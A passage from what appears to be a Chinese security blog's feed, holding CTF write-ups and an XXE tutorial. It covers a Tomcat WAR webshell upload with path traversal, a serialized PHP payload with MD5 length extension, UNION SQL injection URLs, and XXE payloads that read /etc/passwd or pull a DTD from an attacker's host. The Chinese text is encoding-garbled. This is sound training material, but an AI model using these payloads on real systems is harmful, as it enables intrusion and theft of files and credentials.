<h3 id="åå°ä¸Šä¼ waræœ¨é©¬"><a href="#åå°ä¸Šä¼ waræœ¨é©¬" class="headerlink" title="åå°ä¸Šä¼ waræœ¨é©¬"></a>åå°ä¸Šä¼ waræœ¨é©¬</h3><p><a href="https://github.com/LandGrey/webshell-detect-bypassï¼Œç”¨è¿™é‡Œé¢çš„poc" target="_blank" rel="noopener">https://github.com/LandGrey/webshell-detect-bypassï¼Œç”¨è¿™é‡Œé¢çš„poc</a></p>
<p>æŠŠjspæ‰“åŒ…å‹ç¼©æˆwaræ–‡ä»¶ï¼ŒburpæŠ“åŒ…ä¸Šä¼ </p>
<img src="/2020/07/28/WUSTCTF2020/4.png" class="">

<p>å¯ä»¥å‘ç°æ˜¯è‡ªåŠ¨è¿›è¡Œäº†è·¯å¾„æ‹¼æ¥ï¼Œå»æ‰exampleç»§ç»­è®¿é—®</p>
<img src="/2020/07/28/WUSTCTF2020/5.png" class="">

<p>è¿”å›401ï¼ŒUnauthorized</p>
<p>è¿™é‡Œæ˜¯ä¸€ä¸ªæ–°çŸ¥è¯†ç‚¹ï¼Œ<a href="https://www.jianshu.com/p/4cd42f7359f4ï¼Œè¯¦ç»†ä»‹ç»" target="_blank" rel="noopener">https://www.jianshu.com/p/4cd42f7359f4ï¼Œè¯¦ç»†ä»‹ç»</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Authorization: Basic base64encode(username+&quot;:&quot;+password)</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥åŠ ä¸Šå¤´å­—æ®µå°±è¡Œ</p>
<p>è¿™æ—¶å€™ä¼šå‘ç°è¿”å›403ï¼Œè·¯å¾„è®¿é—®åˆ°äº†ï¼Œå´æ— æ³•è®¿é—®ï¼Œä¸€èˆ¬æƒ…å†µä¸‹å°±æ˜¯æƒé™ä¸å¤Ÿï¼Œç¼ºå°‘cookieï¼Œè¿™é‡ŒåŠ ä¸Šcookieå­—æ®µï¼Œå¦‚æœè¿˜æ˜¯403ï¼Œå†åˆ·æ–°ä¸€ä¸‹cookieè¿›è¡Œæ·»åŠ å³å¯</p>
<img src="/2020/07/28/WUSTCTF2020/6.png" class="">

<p>å¯ä»¥çœ‹åˆ°ä¸Šä¼ çš„1.warå·²ç»ä¸Šä¼ åŠ è½½å®Œæˆäº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è®¿é—®ğŸåœ¨çš„è·¯å¾„äº†</p>
<img src="/2020/07/28/WUSTCTF2020/7.png" class="">

<p>åˆ°è¿™é‡Œå¯ä»¥çœ‹åˆ°è·¯å¾„éƒ½æ²¡æœ‰é”™ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸èƒ½è®¿é—®ï¼ŒçŒœæµ‹è¿™é‡Œå¯èƒ½è¿˜æ˜¯è¦è¿›è¡Œç›®å½•ç©¿è¶Šï¼ŒåŠ ä¸Š/..;/æˆåŠŸ</p>
<img src="/2020/07/28/WUSTCTF2020/8.png" class="">

<p>åœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flagï¼Œå’ŒåŸé¢˜è¿˜æ˜¯ä¸å¤ªä¸€æ ·ï¼ŒåŸé¢˜è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå°trickï¼Œè¿™é‡Œç›´æ¥è¯»å°±è¡Œäº†</p>
<img src="/2020/07/28/WUSTCTF2020/9.png" class="">]]></content>
      <tags>
        <tag>WUST</tag>
      </tags>
  </entry>
  <entry>
    <title>SWPUCTF2016-Web-blogsys</title>
    <url>/2020/08/04/SWPUCTF2016-Web-blogsys/</url>
    <content><![CDATA[<h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹<a id="more"></a></h2><ul>
<li>ä»£ç å®¡è®¡åºåˆ—åŒ–</li>
<li>MD5åŠ ç›</li>
<li>MD5æ‰©å±•æ”»å‡»</li>
<li>SQLæ³¨å…¥</li>
</ul>
<h2 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h2><p>å®˜æ–¹wpè¯´æ˜¯åœ¨/web.zipèƒ½å¤Ÿæ‹¿åˆ°æºç ï¼Œè¿™é‡Œç”¨äº†SYCå’Œdirsearchéƒ½æ²¡æœ‰å‘ç°æœ‰éšè—æ–‡ä»¶ï¼Œç›´æ¥çœ‹äº†æºç </p>
<p><code>common.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">Array</span>(<span class="string">"_POST"</span>, <span class="string">"_GET"</span>, <span class="string">"_COOKIE"</span>) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$key <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($v)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"hello,hacker!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $k[<span class="number">0</span>] != <span class="string">'_'</span> ? $$k = addslashes($v) : $$k = <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå­˜åœ¨å˜é‡è¦†ç›–ï¼Œä½†æ˜¯common.phpæ–‡ä»¶åœ¨å¼€å§‹è¢«å¼•ç”¨ï¼Œåˆ°æœ€åä»£ç å€¼ä¾æ—§ä¼šè¢«é‡æ–°è¦†ç›–ï¼Œä¸èƒ½æ§åˆ¶å˜é‡</p>
<p><code>riji.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"common.php"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (@$_SESSION[<span class="string">'login'</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">    header(<span class="string">'Location:/index.php'</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'user'</span>]) &#123;</span><br><span class="line">    $username = $_SESSION[<span class="string">'user'</span>];</span><br><span class="line">    @mysql_conn();</span><br><span class="line">    $sql = <span class="string">"select * from user where name='$username'"</span>;</span><br><span class="line">    $result = @mysql_fetch_array(mysql_query($sql));</span><br><span class="line">    mysql_close();</span><br><span class="line">    <span class="keyword">if</span> ($result[<span class="string">'userid'</span>]) &#123;</span><br><span class="line">        $id = intval($result[<span class="string">'userid'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸éš¾å‘ç°ï¼Œç™»å½•æˆåŠŸä¹‹åsessionå°±ä¼šå­˜åœ¨ï¼Œå¦‚æœç™»å½•ä¹‹åï¼Œå†åˆ é™¤è¯¥ç”¨æˆ·ï¼Œæ•°æ®åº“ä¸­å°±æ‰¾ä¸åˆ°è¯¥ç”¨æˆ·ä¿¡æ¯ï¼Œé‚£ä¹ˆ$idæœªè¢«åˆå§‹åŒ–ï¼Œå°±å¯æ§</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">            @mysql_conn();</span><br><span class="line">            $sql1 = <span class="string">"select * from msg where userid= $id order by id"</span>;</span><br><span class="line">            $query = mysql_query($sql1);</span><br><span class="line">            $result1 = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">while</span> ($temp = mysql_fetch_assoc($query)) &#123;</span><br><span class="line">                $result1[] = $temp;</span><br><span class="line">            &#125;</span><br><span class="line">            mysql_close();</span><br><span class="line">            <span class="keyword">foreach</span> ($result1 <span class="keyword">as</span> $x =&gt; $o) &#123;</span><br><span class="line">                <span class="keyword">echo</span> display($o[<span class="string">'msg'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æŸ¥è¯¢æ—¶ï¼Œ$idæœªè¢«å¼•å·åŒ…è£¹ï¼Œaddslashesç­‰äºæ²¡ç”¨ï¼Œå†çœ‹api.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a &#x3D; unserialize(base64_decode($api));</span><br><span class="line">$a-&gt;do_method();</span><br></pre></td></tr></table></figure>

<p>$apiå‚æ•°æœªè¢«åˆå§‹åŒ–ï¼Œä¹Ÿå°±æ˜¯è¯´æ˜¯å¯æ§çš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//api.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       $username = addslashes(<span class="keyword">$this</span>-&gt;name);<span class="comment">//è¿›å…¥æ•°æ®åº“çš„æ•°æ®è¿›è¡Œè½¬ä¹‰</span></span><br><span class="line">       @mysql_conn();</span><br><span class="line">       $sql = <span class="string">"select * from user where name='$username'"</span>;</span><br><span class="line">       $result = @mysql_fetch_array(mysql_query($sql));</span><br><span class="line">       mysql_close();</span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">empty</span>($result)) &#123;</span><br><span class="line">           <span class="comment">//åˆ©ç”¨ salt éªŒè¯æ˜¯å¦ä¸ºè¯¥ç”¨æˆ·</span></span><br><span class="line">           <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;check === md5($result[<span class="string">'salt'</span>] . <span class="keyword">$this</span>-&gt;data . $username)) &#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">'(=-=)!!'</span>;</span><br><span class="line">               <span class="keyword">if</span> ($result[<span class="string">'role'</span>] == <span class="number">1</span>) &#123;<span class="comment">//æ£€æŸ¥æ˜¯å¦ä¸ºadminç”¨æˆ·</span></span><br><span class="line">                   <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¦é€šè¿‡éªŒè¯ï¼Œéœ€è¦æ‹¿åˆ°md5çš„åŠ ç›å€¼ï¼Œè¿˜è¦åˆ¤æ–­æ˜¯å¦ä¸ºadminç”¨æˆ·ï¼Œæ—¢ç„¶åŒ…å«äº†common.phpï¼Œä¹Ÿå°±æ˜¯è¯´å­˜åœ¨å˜é‡è¦†ç›–æ¼æ´ï¼Œé‚£ä¹ˆ$açš„å±æ€§å€¼å¯æ§</p>
<p><code>$result[&#39;salt&#39;]</code>éšæœºç”Ÿæˆï¼Œæ‰¾ä¸€ä¸‹æ€ä¹ˆæ‰èƒ½æ‹¿åˆ°è¿™ä¸ªå€¼</p>
<p>åœ¨forget.phpæ–‡ä»¶ä¸­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($result)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($result[<span class="string">'salt'</span>]) &#123;</span><br><span class="line">        $check = base64_encode(md5($result[<span class="string">'salt'</span>]));</span><br><span class="line">        $name = $result[<span class="string">'name'</span>];</span><br><span class="line">        header(<span class="string">"Location:/repass.php?username=$name&amp;check=$check&amp;mibao=$mibao&amp;pass=$pass"</span>);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ›´æ”¹å¯†ç æ—¶ä¼šå‘ç”Ÿé¡µé¢è·³è½¬ï¼Œä¸ç®¡æˆåŠŸä¸å¦éƒ½ä¼šçˆ†å‡ºè·¯å¾„å’Œå‚æ•°ï¼Œå…¶ä¸­å°±åŒ…æ‹¬äº†base64åŠ å¯†ä¹‹åçš„</p>
<p><code>$result[&#39;salt&#39;]</code></p>
<p>ä¸‹é¢å°±æ˜¯å“ˆå¸Œæ‹“å±•æ”»å‡»ï¼Œå·¥å…·åœ¨è¿™<a href="https://github.com/JoyChou93/md5-extension-attack" target="_blank" rel="noopener">https://github.com/JoyChou93/md5-extension-attack</a></p>
<p>æ€è·¯æ¸…æ™°äº†ï¼Œå¿˜è®°å¯†ç è¿›è¡Œä¿®æ”¹æ—¶é€šè¿‡å°è¯•æ›´æ”¹adminè´¦æˆ·ï¼Œé¡µé¢è·³è½¬æ‹¿åˆ°<code>$result[&#39;salt&#39;]</code>ï¼Œåœ¨æ„é€ åºåˆ—åŒ–æ•°æ®ï¼Œå†ä¼ å€¼ç»™api.phpä¸­å¯æ§çš„$apiå‚æ•°ï¼Œ$idå¯æ§ï¼Œå†è¿›è¡Œæ•°æ®åº“æ•°æ®çš„æŸ¥è¯¢æ‹¿åˆ°flag</p>
<img src="/2020/08/04/SWPUCTF2016-Web-blogsys/1.png" class="">

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $name = <span class="string">"admin"</span>;</span><br><span class="line">    <span class="keyword">var</span> $check= <span class="string">"6122c04e8a1f3529d556199960ef2556"</span>;</span><br><span class="line">    <span class="keyword">var</span> $data = <span class="string">"\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00"</span>;</span><br><span class="line">    <span class="keyword">var</span> $method=<span class="string">"del_user"</span>;   <span class="comment">//è¦è°ƒç”¨çš„å‡½æ•°</span></span><br><span class="line">    <span class="keyword">var</span> $userid=<span class="string">"2"</span>;  <span class="comment">//è¦åˆ é™¤çš„ç”¨æˆ·</span></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> admin();</span><br><span class="line">$api = base64_encode(serialize($a));</span><br><span class="line"><span class="keyword">echo</span> $api;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#Tzo1OiJhZG1pbiI6NTp7czo0OiJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImNoZWNrIjtzOjMyOiI2MTIyYzA0ZThhMWYzNTI5ZDU1NjE5OTk2MGVmMjU1NiI7czo0OiJkYXRhIjtzOjQ4OiKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAiO3M6NjoibWV0aG9kIjtzOjg6ImRlbF91c2VyIjtzOjY6InVzZXJpZCI7czoxOiIyIjt9</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¦åˆ é™¤çš„ç”¨æˆ·é€šè¿‡æŸ¥çœ‹ç™»å½•ç”¨æˆ·cookieè§£å¯†ä¹‹åå¾—åˆ°çš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(@$login==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	@mysql_conn();</span><br><span class="line">	$sql = <span class="string">"select * from user where name='$username'"</span>;</span><br><span class="line">	$result = @mysql_fetch_array(mysql_query($sql));</span><br><span class="line">	mysql_close();</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($result))</span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>($result[<span class="string">'passwd'</span>] == md5($password))</span><br><span class="line">		&#123;</span><br><span class="line">			$user_cookie = <span class="string">''</span>;</span><br><span class="line">			$user_cookie .= $result[<span class="string">'userid'</span>];</span><br><span class="line">			$user_cookie .= $result[<span class="string">'name'</span>];</span><br><span class="line">			$user_cookie .= $result[<span class="string">'salt'</span>];</span><br><span class="line">			$cookies = base64_encode($user_cookie);</span><br><span class="line">			<span class="comment">//$cookies = $user_cookie;</span></span><br><span class="line">			setcookie(<span class="string">"user"</span>,$cookies,time()+<span class="number">60</span>,<span class="string">'/web/'</span>);</span><br><span class="line">			$_SESSION[<span class="string">'login'</span>] = <span class="number">1</span>;</span><br><span class="line">			$_SESSION[<span class="string">'user'</span>] = $username;</span><br><span class="line">			header(<span class="string">'Location:/web/riji.php'</span>);</span><br></pre></td></tr></table></figure>

<p>æœ€åå°±æ˜¯ä¼ å‚ï¼Œå†å¼€ä¸ªçª—å£æˆ–è€…æ¢ä¸ªæµè§ˆå™¨</p>
<img src="/2020/08/04/SWPUCTF2016-Web-blogsys/2.png" class="">

<p>è¿™æ—¶å€™ä¼šå‘ç°ä¹‹å‰ç™»å½•çš„è´¦å·è¿˜ä¿æŒç™»å½•çš„çŠ¶æ€ï¼Œç›´æ¥æŸ¥flag(å­—æ®µå€¼é€ä¸ªçŒœæµ‹ï¼Œä¸º3)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=-1%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()<span class="comment">#flag,msg,user</span></span><br><span class="line">?id=-1%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x666c6167<span class="comment">#flag</span></span><br><span class="line">?id=-1%20union%20select%201,2,flag%20from%20flag</span><br></pre></td></tr></table></figure>

<img src="/2020/08/04/SWPUCTF2016-Web-blogsys/3.png" class="">]]></content>
      <tags>
        <tag>SWPU</tag>
      </tags>
  </entry>
  <entry>
    <title>XXEæ¼æ´</title>
    <url>/2020/01/16/XXE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h4 id="1-ä»€ä¹ˆæ˜¯XXEæ¼æ´"><a href="#1-ä»€ä¹ˆæ˜¯XXEæ¼æ´" class="headerlink" title="1.ä»€ä¹ˆæ˜¯XXEæ¼æ´"></a>1.ä»€ä¹ˆæ˜¯XXEæ¼æ´<a id="more"></a></h4><p>XXEæ¼æ´å…¨ç§°ä¸ºXML External Entity Injection å³xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼ŒXXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·dosæ”»å‡»ç­‰å±å®³</p>
<p>DTD:æ–‡æ¡£ç±»å‹å®šä¹‰</p>
<p>DTDå®ä½“<br>DTDå®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå¯ä»¥å†…éƒ¨å£°æ˜æˆ–å¤–éƒ¨å¼•ç”¨ã€‚</p>
<p>å®ä½“åˆåˆ†ä¸ºä¸€èˆ¬å®ä½“å’Œå‚æ•°å®ä½“<br>1ï¼Œä¸€èˆ¬å®ä½“çš„å£°æ˜è¯­æ³•:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY å®ä½“å &quot;å®ä½“å†…å®¹&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>å¼•ç”¨å®ä½“çš„æ–¹å¼ï¼š&amp;å®ä½“åï¼›<br>2ï¼Œå‚æ•°å®ä½“åªèƒ½åœ¨DTDä¸­ä½¿ç”¨ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ ¼å¼ï¼š <code>&lt;!ENTITY % å®ä½“å &quot;å®ä½“å†…å®¹&quot;&gt;</code><br>å¼•ç”¨å®ä½“çš„æ–¹å¼ï¼š%å®ä½“åï¼›</p>
<p>1ï¼Œå†…éƒ¨å®ä½“å£°æ˜:<code>&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt; ex:&lt;!ENTITY eviltest &quot;eviltest&quot;&gt;</code></p>
<p>  æ³¨æ„å’ŒDTDä¸­çš„å…ƒç´ å£°æ˜åŒºåˆ«</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY å£°æ˜å…ƒç´ &gt;</span><br></pre></td></tr></table></figure>

<p><strong>2ï¼Œå¤–éƒ¨å®ä½“å£°æ˜:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure>

<h2 id="XXEçš„æ”»å‡»ä¸å±å®³ï¼ˆXML-External-Entityï¼‰"><a href="#XXEçš„æ”»å‡»ä¸å±å®³ï¼ˆXML-External-Entityï¼‰" class="headerlink" title="XXEçš„æ”»å‡»ä¸å±å®³ï¼ˆXML External Entityï¼‰"></a>XXEçš„æ”»å‡»ä¸å±å®³ï¼ˆXML External Entityï¼‰</h2><h4 id="1ï¼Œä½•ä¸ºXXE"><a href="#1ï¼Œä½•ä¸ºXXE" class="headerlink" title="1ï¼Œä½•ä¸ºXXE?"></a>1ï¼Œä½•ä¸ºXXE?</h4><p>ç­”ï¼š xxeä¹Ÿå°±æ˜¯xmlå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚ä¹Ÿå°±æ˜¯ä¸Šæ–‡ä¸­åŠ ç²—çš„é‚£ä¸€éƒ¨åˆ†ã€‚</p>
<h4 id="2ï¼Œæ€æ ·æ„å»ºå¤–éƒ¨å®ä½“æ³¨å…¥ï¼Ÿ"><a href="#2ï¼Œæ€æ ·æ„å»ºå¤–éƒ¨å®ä½“æ³¨å…¥ï¼Ÿ" class="headerlink" title="2ï¼Œæ€æ ·æ„å»ºå¤–éƒ¨å®ä½“æ³¨å…¥ï¼Ÿ"></a>2ï¼Œæ€æ ·æ„å»ºå¤–éƒ¨å®ä½“æ³¨å…¥ï¼Ÿ</h4><p>æ–¹å¼ä¸€ï¼šç›´æ¥é€šè¿‡DTDå¤–éƒ¨å®ä½“å£°æ˜<br>XMLå†…å®¹</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ–¹å¼äºŒï¼šé€šè¿‡DTDæ–‡æ¡£å¼•å…¥å¤–éƒ¨DTDæ–‡æ¡£ï¼Œå†å¼•å…¥å¤–éƒ¨å®ä½“å£°æ˜<br>XMLå†…å®¹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://mark4z5.com/evil.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;B;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>DTDæ–‡ä»¶å†…å®¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>æ–¹å¼ä¸‰ï¼šé€šè¿‡DTDå¤–éƒ¨å®ä½“å£°æ˜å¼•å…¥å¤–éƒ¨å®ä½“å£°æ˜<br>å¥½åƒæœ‰ç‚¹æ‹—å£ï¼Œå…¶å®æ„æ€å°±æ˜¯å…ˆå†™ä¸€ä¸ªå¤–éƒ¨å®ä½“å£°æ˜ï¼Œç„¶åå¼•ç”¨çš„æ˜¯åœ¨æ”»å‡»è€…æœåŠ¡å™¨ä¸Šé¢çš„å¤–éƒ¨å®ä½“å£°æ˜<br>å…·ä½“çœ‹ä¾‹å­,XMLå†…å®¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">	&lt;!ENTITY % d SYSTEM &quot;http:&#x2F;&#x2F;mark4z5.com&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">	%d;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;</span><br></pre></td></tr></table></figure>

<p>dtdæ–‡ä»¶å†…å®¹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="äº§ç”Ÿå“ªäº›å±å®³ï¼Ÿ"><a href="#äº§ç”Ÿå“ªäº›å±å®³ï¼Ÿ" class="headerlink" title="äº§ç”Ÿå“ªäº›å±å®³ï¼Ÿ"></a>äº§ç”Ÿå“ªäº›å±å®³ï¼Ÿ</h4><p>XXEå±å®³1ï¼šè¯»å–ä»»æ„æ–‡ä»¶</p>
<p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145026738-1407663000.png" alt="img"></p>
<p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145035082-1171815922.png" alt="img"></p>
<p>è¯¥CASEæ˜¯è¯»å–/etc/passwdï¼Œæœ‰äº›XMLè§£æåº“æ”¯æŒåˆ—ç›®å½•ï¼Œæ”»å‡»è€…é€šè¿‡åˆ—ç›®å½•ã€è¯»æ–‡ä»¶ï¼Œè·å–å¸å·å¯†ç åè¿›ä¸€æ­¥æ”»å‡»ï¼Œå¦‚è¯»å–tomcat-users.xmlå¾—åˆ°å¸å·å¯†ç åç™»å½•tomcatçš„manageréƒ¨ç½²webshellã€‚</p>
<p>å¦å¤–ï¼Œæ•°æ®ä¸å›æ˜¾å°±æ²¡æœ‰é—®é¢˜äº†å—ï¼Ÿå¦‚ä¸‹å›¾</p>
<p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145050972-1215502458.png" alt="img"></p>
<p>ä¸ï¼Œå¯ä»¥æŠŠæ•°æ®å‘é€åˆ°è¿œç¨‹æœåŠ¡å™¨</p>
<p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145104285-1507820174.png" alt="img"></p>
<p>è¿œç¨‹evil.dtdæ–‡ä»¶å†…å®¹å¦‚ä¸‹</p>
<p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145111863-976147511.png" alt="img"></p>
<p>è§¦å‘XXEæ”»å‡»åï¼ŒæœåŠ¡å™¨ä¼šæŠŠæ–‡ä»¶å†…å®¹å‘é€åˆ°æ”»å‡»è€…ç½‘ç«™</p>
<p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145120957-1229784360.png" alt="img"></p>
<p>XXEå±å®³2ï¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p>
<p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145129957-1907303428.png" alt="img"></p>
<p>è¯¥CASEæ˜¯åœ¨å®‰è£…expectæ‰©å±•çš„PHPç¯å¢ƒé‡Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå…¶ä»–åè®®ä¹Ÿæœ‰å¯èƒ½å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p>
<p>XXEå±å®³3ï¼šæ¢æµ‹å†…ç½‘ç«¯å£</p>
<p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145153722-1549362415.png" alt="img"></p>
<p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145204847-766408731.png" alt="img"></p>
<p>è¯¥CASEæ˜¯æ¢æµ‹192.168.1.1çš„80ã€81ç«¯å£ï¼Œé€šè¿‡è¿”å›çš„â€œConnection refusedâ€å¯ä»¥çŸ¥é“è¯¥81ç«¯å£æ˜¯closedçš„ï¼Œè€Œ80ç«¯å£æ˜¯opençš„ã€‚</p>
<p>XXEå±å®³4ï¼šæ”»å‡»å†…ç½‘ç½‘ç«™</p>
<p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145220472-216779729.png" alt="img"></p>
